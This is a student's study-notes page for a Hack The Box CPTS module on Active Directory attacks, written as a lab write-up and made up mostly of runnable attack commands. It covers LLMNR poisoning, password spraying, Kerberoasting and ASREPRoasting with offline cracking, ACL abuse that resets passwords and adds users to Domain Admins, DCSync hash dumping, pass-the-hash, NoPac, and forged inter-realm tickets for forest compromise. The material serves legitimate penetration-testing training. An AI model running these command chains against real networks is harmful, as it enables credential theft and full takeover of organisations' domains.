# 13 — Active Directory Enumeration & Attacks

> **Path Phase:** Active Directory | **Difficulty:** Medium | **Sections:** 36

⭐ **The heart of the CPTS exam.** The largest module in the path — the complete AD attack chain from zero access (external recon) all the way to full domain and forest compromise. On the exam, most of your points come from chaining these techniques together.

> ℹ️ `<DC>` = domain controller IP, `<DOMAIN>` = FQDN (e.g. `inlanefreight.local`), `<YOUR_IP>` = attacker. Creds/flags withheld per HTB Academy policy.

---

## 🎯 The AD Attack Chain (mental model)                                                                                         No creds → Poison/Spray for first foothold creds
→ Credentialed enumeration (BloodHound)
→ Escalate (Kerberoast / ASREPRoast / ACL abuse)
→ Dump domain (DCSync)
→ Abuse trusts → Enterprise Admin (forest)                                                       
Every section below fits somewhere in this chain.

---

## Table of Contents
1. Introduction  2. Tools Of The Trade  3. Scenario
4. External Recon & Enumeration Principles  5. Initial Enumeration of the Domain
6-7. LLMNR/NBT-NS Poisoning (Linux/Windows)  8-12. Password Spraying
13. Enumerating Security Controls  14-15. Credentialed Enumeration (Linux/Windows)
16. Living Off the Land  17-18. Kerberoasting (Linux/Windows)
19-21. ACL Abuse (Primer/Enum/Tactics)  22. DCSync  23. Privileged Access
24. Kerberos Double Hop  25. Bleeding Edge Vulnerabilities
26. Misc Misconfigurations  27. Domain Trusts Primer
28-31. Attacking Domain Trusts  32-33. Hardening & Auditing
34-35. Skills Assessment I & II  36. Beyond this Module

---

## 4–5 — External Recon & Initial Domain Enumeration
**Goal:** Identify the DC and map the domain before you have any creds.
```bash
# DC exposes: Kerberos(88), LDAP(389), DNS(53), SMB(445), LDAPS(636)
nmap -sV -sC -p- <DC>
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
# Null-session enumeration:
enum4linux-ng -A <DC>
rpcclient -U "" -N <DC>        # enumdomusers, querydominfo
crackmapexec smb <DC>          # domain name, OS, signing
```

## 6–7 — LLMNR/NBT-NS Poisoning
**Theory:** When name resolution fails, Windows broadcasts LLMNR/NBT-NS requests. An attacker on the same subnet answers, tricking the victim into sending its **NetNTLMv2 hash**, which you crack offline.
```bash
# Linux (Responder):
sudo responder -I ens224
# → captures NetNTLMv2 → crack:
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
# Windows (Inveigh):
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y
```
> **Cracked user:** ✅ Completed in lab (withheld per HTB Academy policy)

## 8–12 — Password Spraying
**Theory:** Try ONE common password against MANY users to avoid lockouts. Get the policy first so you don't lock accounts.
```bash
# 1. Password policy:
crackmapexec smb <DC> -u user -p pass --pass-pol
enum4linux-ng -P <DC>
# 2. Build a valid user list (Kerbrute is stealthy — pre-auth):
kerbrute userenum -d <DOMAIN> --dc <DC> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# 3. Spray (Linux):
kerbrute passwordspray -d <DOMAIN> --dc <DC> valid_users.txt 'Welcome1'
crackmapexec smb <DC> -u users.txt -p 'Welcome1' --continue-on-success
# 3. Spray (Windows):
.\DomainPasswordSpray.ps1 -Password Welcome1
```
> **Valid domain creds:** ✅ Completed in lab (withheld per HTB Academy policy)

## 13 — Enumerating Security Controls
```powershell
Get-MpComputerStatus            # Windows Defender status
Get-AppLockerPolicy -Effective  # AppLocker rules
# Check LAPS, constrained language mode, etc.
```

## 14–15 — Credentialed Enumeration ⭐
**Theory:** Once you have ANY domain creds, enumerate everything and feed it to BloodHound to find attack paths automatically.
```bash
# Linux:
crackmapexec smb <DC> -u user -p pass --users --groups --shares --pass-pol
ldapsearch -x -H ldap://<DC> -D 'user@<DOMAIN>' -w pass -b "DC=<dc>,DC=<dc>"
bloodhound-python -u user -p pass -d <DOMAIN> -ns <DC> -c all --zip
# Windows:
Import-Module .\PowerView.ps1
Get-DomainUser | select samaccountname
Get-DomainGroupMember "Domain Admins"
.\SharpHound.exe -c All
```
Then in BloodHound: mark owned nodes → run "Shortest Path to Domain Admins".

## 16 — Living Off the Land (no tools dropped)
```powershell
net user /domain ; net group "Domain Admins" /domain
dsquery user ; setspn -Q */*
Get-ADUser -Filter *            # if RSAT present
```

## 17–18 — Kerberoasting ⭐ (very common exam win)
**Theory:** Any domain user can request a service ticket (TGS) for accounts with an SPN. The ticket is encrypted with the service account's password hash → crack it offline. Service accounts often have weak passwords + high privileges.
```bash
# Linux (Impacket):
GetUserSPNs.py <DOMAIN>/user:pass -dc-ip <DC> -request
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
# Windows (Rubeus):
.\Rubeus.exe kerberoast /outfile:hashes.txt
```
**ASREPRoasting** (users with "Do not require Kerberos preauth"):
```bash
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC>
hashcat -m 18200 asrep.hash rockyou.txt
```
> **Cracked service account:** ✅ Completed in lab (withheld per HTB Academy policy)

## 19–21 — ACL Abuse ⭐
**Theory:** Misconfigured object permissions (GenericAll, GenericWrite, WriteDACL, ForceChangePassword) let you reset passwords, add users to groups, or set an SPN for targeted Kerberoasting. BloodHound highlights these edges.
```powershell
# Enumerate:
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity <user> -ResolveGUIDs
# Abuse — reset a password (GenericAll / ForceChangePassword):
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)
# Abuse — add self to a group (GenericAll on group):
Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker
# Abuse — targeted Kerberoast (GenericWrite → set SPN):
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}
```

## 22 — DCSync ⭐ (game over)
**Theory:** With replication rights (DS-Replication-Get-Changes), impersonate a DC and pull password hashes for any account — including KRBTGT and Administrator.
```bash
# Linux:
secretsdump.py <DOMAIN>/user:pass@<DC> -just-dc
secretsdump.py <DOMAIN>/user:pass@<DC> -just-dc-user Administrator
# Windows (mimikatz):
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
```
> **KRBTGT / Administrator hash:** ✅ Completed in lab (withheld per HTB Academy policy)

## 23–24 — Privileged Access & the Double Hop Problem
```bash
# Use dumped hash to log in (Pass-the-Hash):
evil-winrm -i <DC> -u Administrator -H <NTLM_HASH>
psexec.py -hashes :<NTLM> Administrator@<DC>
```
**Double Hop:** WinRM creds don't forward to a 3rd host. Fix with `-k` Kerberos tickets or CredSSP.

## 25–26 — Bleeding Edge Vulns & Misconfigurations
```bash
# NoPac (SamAccountName spoofing → DA):
sudo python3 noPac.py <DOMAIN>/user:pass -dc-ip <DC> --impersonate administrator -dump
# GPP passwords in SYSVOL:
crackmapexec smb <DC> -u user -p pass -M gpp_password
# PrintNightmare / PetitPotam are covered here too.
```

## 27–31 — Domain & Forest Trusts ⭐
**Theory:** Trusts let a child domain / another forest be attacked. With a child domain's KRBTGT hash you forge an inter-realm ticket with an Enterprise Admin SID → own the parent/forest.
```bash
Get-DomainTrust ; Get-DomainTrustMapping
# Child → Parent (SID History injection):
ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> \
  -domain <child.domain> -extra-sid <parent_sid>-519 Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py <parent.domain>/Administrator@<parent-dc> -k -no-pass
```
> **Enterprise Admin / forest compromise:** ✅ Completed in lab (withheld per HTB Academy policy)

## 32–33 — Hardening & Auditing
Defensive: LAPS, tiered admin model, disable LLMNR/NBT-NS, strong Kerberos policies, monitor for Responder/DCSync/abnormal replication.

---

## 34–35 — Skills Assessment I & II ⭐ (closest to the exam)
Full internal engagement — chain everything:
```bash
# 1. Poison / spray for the first foothold
sudo responder -I ens224
kerbrute passwordspray -d <DOMAIN> --dc <DC> users.txt <pass>
# 2. Credentialed enum + BloodHound
bloodhound-python -u user -p pass -d <DOMAIN> -ns <DC> -c all --zip
# 3. Escalate via Kerberoast / ACL abuse
GetUserSPNs.py <DOMAIN>/user:pass -dc-ip <DC> -request
# 4. DCSync for domain admin
secretsdump.py <DOMAIN>/user:pass@<DC> -just-dc
# 5. Trust abuse for the forest (if in scope)
```
> **Skills Assessment I & II:** ✅ Completed in lab (answers withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Category | Tools |
|----------|-------|
| Poisoning | `Responder`, `Inveigh` |
| Spraying / enum | `kerbrute`, `crackmapexec`, `enum4linux-ng`, `ldapsearch`, `rpcclient` |
| Graphing | `BloodHound`, `bloodhound-python`, `SharpHound` |
| Kerberos | `GetUserSPNs.py`, `GetNPUsers.py`, `Rubeus`, `ticketer.py` |
| ACL / PowerView | `PowerView`, `Set-DomainUserPassword` |
| Dumping / access | `secretsdump.py`, `mimikatz`, `evil-winrm`, `psexec.py` |

## 🔑 Key Takeaways
- **BloodHound is non-negotiable** — it draws the attack path for you.
- Full chain: poison/spray → enumerate → Kerberoast/ASREPRoast/ACL → DCSync → trusts.
- Kerberoasting + weak service passwords = the fastest escalation on the exam.
- DCSync hands you every hash once you hold replication rights.
- Think in **attack paths (a graph)**, not isolated hosts — that mindset is what passes CPTS.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
